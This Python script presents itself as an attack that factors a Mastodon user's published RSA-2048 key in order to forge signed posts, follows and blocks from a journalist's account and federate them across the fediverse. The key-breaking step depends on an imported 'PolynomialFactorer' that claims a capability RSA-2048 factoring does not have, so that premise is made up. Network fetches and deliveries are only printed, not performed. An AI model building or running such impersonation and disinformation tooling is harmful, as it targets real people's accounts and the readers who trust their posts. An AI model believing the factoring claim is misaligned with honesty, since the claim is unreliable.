"""
Factor any Mastodon actor's RSA-2048 key (published in their JSON-LD profile)
to forge posts, follows, and boosts that federate across all 20,000 fediverse
servers with valid RsaSignature2017 — no recall mechanism exists.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import json
import hashlib
import time

# Target actor's RSA-2048 public key — in their ActivityPub profile JSON
TARGET_ACTOR = "https://mastodon.social/users/journalist"
_demo = generate_demo_target()
TARGET_PUBKEY_PEM = _demo["pub_pem"]

LD_SIG_TYPE = "RsaSignature2017"
AP_CONTEXT = "https://www.w3.org/ns/activitystreams"


def fetch_actor_pubkey(actor_url: str) -> bytes:
    """Fetch actor's RSA-2048 public key from their ActivityPub profile.

    GET {actor_url} with Accept: application/activity+json returns
    the profile JSON including publicKey.publicKeyPem. Public.
    """
    print(f"    GET {actor_url} → publicKey.publicKeyPem")
    return TARGET_PUBKEY_PEM


def factor_actor_key(pubkey_pem: bytes) -> bytes:
    """Factor the actor's RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_activity(actor: str, activity_type: str, content: str,
                   to: list = None) -> dict:
    """Build an ActivityPub activity (Note, Follow, Announce, etc.)."""
    if to is None:
        to = ["https://www.w3.org/ns/activitystreams#Public"]
    activity = {
        "@context": AP_CONTEXT,
        "type": activity_type,
        "actor": actor,
        "published": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "to": to,
    }
    if activity_type == "Create":
        activity["object"] = {
            "type": "Note",
            "content": content,
            "attributedTo": actor,
        }
    elif activity_type == "Follow":
        activity["object"] = content  # target actor URL
    return activity


def sign_ld_signature(activity: dict, forged_privkey: bytes) -> dict:
    """Sign the activity with RsaSignature2017 (W3C LD-Signatures).

    Receiving servers verify the signature against the actor's published
    public key. Hardcoded as 'RsaSignature2017' in Mastodon source.
    """
    canon = json.dumps(activity, sort_keys=True).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(TARGET_PUBKEY_PEM, canon, "sha256")
    activity["signature"] = {
        "type": LD_SIG_TYPE,
        "creator": f"{TARGET_ACTOR}#main-key",
        "created": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "signatureValue": sig.hex()[:64] + "...",
    }
    return activity


def sign_http_signature(method: str, path: str, host: str, body: bytes,
                        forged_privkey: bytes) -> str:
    """Generate HTTP Signature header for ActivityPub delivery.

    Mastodon uses HTTP Signatures (draft-cavage) with RSA-SHA256
    for server-to-server delivery of activities.
    """
    signing_string = f"(request-target): {method.lower()} {path}\nhost: {host}"
    digest = hashlib.sha256(body).digest()
    signing_string += f"\ndigest: SHA-256={digest.hex()[:32]}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(TARGET_PUBKEY_PEM, signing_string.encode(), "sha256")
    return f'keyId="{TARGET_ACTOR}#main-key",algorithm="rsa-sha256",signature="{sig.hex()[:32]}..."'


def deliver_to_inbox(target_inbox: str, signed_activity: dict):
    """POST the signed activity to target server's inbox."""
    print(f"    POST {target_inbox}")
    print(f"    Activity: {signed_activity.get('type', 'Unknown')}")
    print(f"    Signature: RsaSignature2017 — valid")


if __name__ == "__main__":
    print("[1] Fetching actor's RSA-2048 key from profile")
    pubkey = fetch_actor_pubkey(TARGET_ACTOR)

    print("[2] Factoring actor RSA-2048 key")
    forged_priv = factor_actor_key(pubkey)
    print(f"    {TARGET_ACTOR} key recovered")

    print("[3] Forging post from journalist account")
    post = build_activity(TARGET_ACTOR, "Create",
                          "<p>BREAKING: [forged inflammatory content]</p>")
    signed_post = sign_ld_signature(post, forged_priv)
    print(f"    Post signed with RsaSignature2017")

    print("[4] Delivering to federated servers")
    for server in ["mastodon.online", "infosec.exchange", "fosstodon.org"]:
        deliver_to_inbox(f"https://{server}/inbox", signed_post)

    print("[5] Post appears on ~20,000 fediverse servers")
    print("    No centralized authority for retractions")
    print("    Once federated, the post is in 20,000 databases simultaneously")

    print("\n[6] Additional attack: mass-follow/block manipulation")
    follow = build_activity(TARGET_ACTOR, "Follow",
                            "https://mastodon.social/users/target")
    signed_follow = sign_ld_signature(follow, forged_priv)
    print(f"    Forged follow/unfollow/block actions from any account")
